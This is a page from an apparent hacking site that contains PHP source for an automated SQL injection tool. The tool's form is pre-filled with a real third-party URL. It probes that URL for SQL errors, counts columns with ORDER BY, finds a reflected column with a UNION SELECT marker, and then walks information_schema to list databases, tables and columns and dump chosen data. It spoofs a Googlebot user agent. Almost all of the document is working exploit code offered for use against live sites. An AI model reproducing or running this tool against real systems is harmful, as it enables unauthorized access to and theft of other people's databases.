<meta charset="utf-8"/>    
<link href="https://u.jimcdn.com/e/o/s4b9297615becb54c/layout/l1affff356675b865/css/main.css?t=1474308074" rel="stylesheet" type="text/css" id="jimdo_main_css"/>
<title> Sql Injection </title>
    <script>
    //<![CDATA[
        var jimdoData = {"isTestserver":false,"isLcJimdoCom":false,"isJimdoHelpCenter":false,"isProtectedPage":false,"cstok":"","cacheJsKey":"feca2728c1b6bfec0b3e1b76227262aa52c850c5","cacheCssKey":"feca2728c1b6bfec0b3e1b76227262aa52c850c5","cdnUrl":"https:\/\/assets.jimstatic.com\/","minUrl":"https:\/\/assets.jimstatic.com\/app\/cdn\/min\/file\/","authUrl":"https:\/\/a.jimdo.com\/","webPath":"http:\/\/hackparadise.jimdo.com\/","appUrl":"http:\/\/a.jimdo.com\/","cmsLanguage":"fr_FR","isFreePackage":true,"mobile":false,"isDevkitTemplateUsed":false,"isTemplateResponsive":false,"websiteId":"s4b9297615becb54c","pageId":966313364,"packageId":1,"shop":{"deliveryTimeTexts":{"1":"1 \u00e0 3 jours de d\u00e9lai de livraison","2":"3 \u00e0 5 jours de d\u00e9lai de livraison","3":"5 \u00e0 8 jours de d\u00e9lai de livraison"},"checkoutButtonText":"Paiement","isReady":true,"currencyFormat":{"pattern":"#,##0.00 \u00a4","convertedPattern":"#,##0.00 $","symbols":{"GROUPING_SEPARATOR":".","DECIMAL_SEPARATOR":",","CURRENCY_SYMBOL":"\u20ac"}},"currencyLocale":"de_DE"},"tr":{"gmap":{"searchNotFound":"L'adresse entr\u00e9e n'a pu \u00eatre trouv\u00e9e. ","routeNotFound":"L'itin\u00e9raire n'a pas pu \u00eatre calcul\u00e9. Raisons possibles: l'adresse de d\u00e9part n'est pas assez pr\u00e9cise ou trop \u00e9loign\u00e9e de l'adresse d'arriv\u00e9e."},"shop":{"checkoutSubmit":{"next":"\u00c9tape suivante","wait":"Attendez s'il vous pla\u00eet"},"paypalError":"Une erreur est intervenue. Veuillez r\u00e9essayer !","cartBar":"Panier d'achat","maintenance":"Cette e-boutique est indisponible pour le moment. Veuillez r\u00e9essayer plus tard.","addToCartOverlay":{"productInsertedText":"L'article a \u00e9t\u00e9 ajout\u00e9 au panier.","continueShoppingText":"Continuer les achats","reloadPageText":"Charger \u00e0 nouveau"},"notReadyText":"Cette e-boutique n'est pas encore compl\u00e8te.","numLeftText":"Plus de {:num} exemplaires de cet article ne sont  pas disponibles pour le moment.","oneLeftText":"Seulement un exemplaire de cet article est disponible."},"common":{"timeout":"Un probl\u00e8me est survenu. L'action demand\u00e9e a \u00e9t\u00e9 annul\u00e9e. Veuillez r\u00e9essayer dans quelques minutes."},"form":{"badRequest":"Une erreur est survenue. Les donn\u00e9es n'ont pas pu \u00eatre transmises. Veuillez essayer \u00e0 nouveau. "}},"jQuery":"jimdoGen002","isJimdoMobileApp":false,"bgConfig":null,"bgFullscreen":null,"responsiveBreakpointLandscape":767,"responsiveBreakpointPortrait":480,"copyableHeadlineLinks":false,"tocGeneration":false,"googlemapsConsoleKey":false};
    // ]]>
</script>
<style type="text/css">
a{
	color: yellow;
	text-decoration: none;
}
</style>        
    </head>

<body class="body cc-page cc-pagemode-default cc-content-parent" id="page-966313364">

<html><head></head><body style="
    color: red;
">
 <h1 style="
    text-align: center;
    font-size: 15px;
    color: green;
"> SQL DETECTED : </h1>
 <form action="" method="POST" style="
    text-align: center;">
<input type='text'name="list" style="
    margin: 0px auto;
    width: 356px;
    background-color: white;
    color: black;
	font-size: 10px;
" value="http://www.bible-history.com/subcat.php?id=2"><br>
<input type="submit" value="send" name="send">

</form>
</body></html>

<?php
session_start();
set_time_limit(0);
?>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script>
</script>
</head>
<?php
function vbflush(){
	if(ob_get_length() !== false){
		@ob_flush();
	}
	flush();
}
function getsource($link){
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
curl_setopt($ch, CURLOPT_ENCODING, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$exe = curl_exec($ch);
return $exe;
}
function getsourcee($link){
	$removeBom = preg_replace('/\\0/', "", $link);
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_URL, $removeBom);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
curl_setopt($ch, CURLOPT_ENCODING, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$exe = curl_exec($ch);
return $exe;
}
function sqldetect($link){
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$link);
curl_setopt($ch,CURLOPT_HEADER,0);
curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
curl_setopt($ch, CURLOPT_USERAGENT , 'Mozilla/5.0 (Windows NT 6.1)');
curl_setopt($ch, CURLOPT_RETURNTRANSFER , 1); //eturntransfer
$exe = curl_exec($ch);
if (preg_match("/error in your SQL syntax|mysql_fetch_array()|Failed Query|MySQL Error|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$exe)) return "<div style='color: yellow; text-align: center;'>$link:Sql Detected</div>  <br />";
}
function strToHex($string){
$hex='';
for($i=0;$i<strlen($string);$i++){
$hex .= dechex(ord($string[$i]));
}
return "0x" . $hex;
}
if(isset($_POST['send'])) {
$single = "'";
$link = $_POST['list'].$single;
$url = $_POST['list'];
echo "<a href='?index=sql'>".sqldetect($link)." </a>";
$_SESSION['url'] = $url;
}
if($_REQUEST['index'] == 'sql')
{
	$x = 1;
	while($x <= 20){
    $a = $_SESSION['url']."+order+by+$x <br />";
	$x++;
	if(sqldetect($a))
	{
		break;
	}


	}
if($x == 2)
{
	$coloms = $x-1;
}elseif ($x == 1) {
	$coloms = $x;
}
else {
	$coloms = $x-2;
}
	echo "Number OF Columns :".$coloms."<br />";
	vbflush();
    echo "<a href='?index=sql&sql=sql'>Next>> </a> <br />";
    if($_GET['sql'] == 'sql')
	{
	$num = 1000;
	$xx = 1;
  while($xx <= $coloms)
	{
    $aa[] = "($xx)";
    $xx++;
	}
$aa = "".implode(",",$aa)."";
$urle = $_SESSION['url']."+union+select+$aa--";
$urle = str_replace("+union","100+union",$urle);
for ($s=1; $s <=$coloms ; $s++) {
	$urle_e = str_replace("($s)","0x4c61646f73",$urle);
$data = getsource($urle_e);
if(preg_match("/Lados/i",$data))
{
$in = $s;
echo "Infected Column : $in";
	vbflush();
break;
}

}
if($in)
{
$urle_version = str_replace("($in)","(unhex(hex(cOnCaT(0x4c61646f73,0x3a,version(),0x3a,DATABASE(),0x4c61646f73))))",$urle);
$dates = getsource($urle_version);
if(preg_match('/Lados(.*?)Lados/',$dates,$matche))
		{
		$mat = explode(":",$matche[1]);
		echo "<br /> version : $mat[1]";
		echo "<br /> databasse : $mat[2]";
		$urle_data = str_replace("($in)",'(unhex(hex(cOnCaT(0x4c61646f73,group_concat(schema_name),0x4c61646f73))))',$urle);
		$urle_data = str_replace('--','+from+information_schema.schemata--',$urle_data);
		$source_data = getsource($urle_data);
		if(preg_match('/Lados(.*?)Lados/i',$source_data,$source))
		{
		echo "<form action='' method='POST'>";
		$souc_e = explode(",",$source[1]);
		echo "<br /> databasse :
		 ";
		foreach ($souc_e as $sous) {
			echo "<br /> <input type='checkbox'  name='columns' value='$sous' >$sous</option>
			";
		}
			vbflush();
		echo "<br /><input type='submit' value='next' name='next' class='next'> <br />";
		if(isset($_POST['next']) and $_POST['next'] == 'next')
		{
		$tables =  strToHex($_POST['columns']);
		$_SESSION['ok'] = $tables;
		$urlee_date = str_replace("group_concat(schema_name)","group_concat(table_name)",$urle_data);
		$urlee_date = str_replace(".schemata--",".tables+where+table_schema+like+$tables--",$urlee_date);
		//$_SESSION['urlesession'] = $urlee_date;
		$source_date = getsource($urlee_date);
		if(preg_match('/Lados(.*?)Lados/i',$source_date,$colos))
		{
			$colos = explode(',',$colos[1]);
				foreach ($colos as $key) {
					echo "<br /> <input type='checkbox'  name='colos' value='$key' >$key <br />";
				}
		}
			vbflush();
		echo "
		<input type='submit' name='go' value='next' class='next'>";
		}
		if(isset($_POST['go']) and $_POST['go'] == 'next')
		{
		$tables = $_SESSION['ok'];
		$table_coloms = strToHex($_POST['colos']);
		$url = $_SESSION['url'];
		$url .="100+union+select+$aa+from+information_schema.cOlUmNs+WhErE+table_schema=$tables+and+table_name=$table_coloms+--";
		$url = str_replace("($in)","(unhex(hex(cOnCaT(0x4c61646f73,group_concat(CoLuMn_NaMe),0x4c61646f73))))",$url);
		$data = getsource($url);
		if(preg_match('/Lados(.*?)Lados/i',$data,$colos))
		{

		  $colos_ = explode(",",$colos[1]);
		  $tabhex = hexToStr($tables);
		  $coloshex = hexToStr($table_coloms);
			$_SESSION['tabhex'] = $tabhex;
			$_SESSION['coloshex'] = $coloshex;
			echo "Columns : <br />";
			foreach ($colos_ as $value) {
			echo "<input type='checkbox'  name='colosinfo' value='$value' >$value <br />";
			}
				vbflush();
			$_SESSION['colosinfo'] = $_POST['colosinfo'];
			$t = $_SESSION['ok'];
			$tes = $table_coloms;
			$urle = str_replace("cOnCaT", "cOnCaT", $url);
			$urle = str_replace("CoLuMn_NaMe","YOYO", $urle);
			$urle = str_replace("+from+information_schema.cOlUmNs+WhErE+table_schema=$t+and+table_name=$tes+--", "
		 +FrOm+$tabhex.$coloshex+--", $urle);
			 echo "<input type='submit' name='neeeXt' value='next'>";
		}
		}
			 if(isset($_POST['neeeXt']) and $_POST['neeeXt'] == 'next')
				 {
						$tes = $_SESSION['tabhex'];
					  $coloshex = $_SESSION['coloshex'];
					$ase = $_POST['colosinfo'];
					$urle = str_replace("--","",$urle);
					$url_e = str_replace("($in)","(unhex(hex(cOnCaT(0x4c61646f73,group_concat($ase),0x4c61646f73))))",$urle);
					$url_e = str_replace("--+FrOm","+FrOm",$url_e);
					$url_e .= "+FrOm+$tes.$coloshex--";
					$finale_ = getsourcee($url_e);
						if(preg_match("/Lados(.*?)Lados/i",$finale_,$for))
						{
							$finale__ = explode(",",$for[1]);
								foreach ($finale__ as $ok) {
									echo "<br />".$ok."<br />";
								}
						}
				 }
		 }


		}
}
}
}
		function hexToStr($hex){
			$string='';
			for ($i=0; $i < strlen($hex)-1; $i+=2){
				$string .= chr(hexdec($hex[$i].$hex[$i+1]));
			}
			return $string;
		}
?>
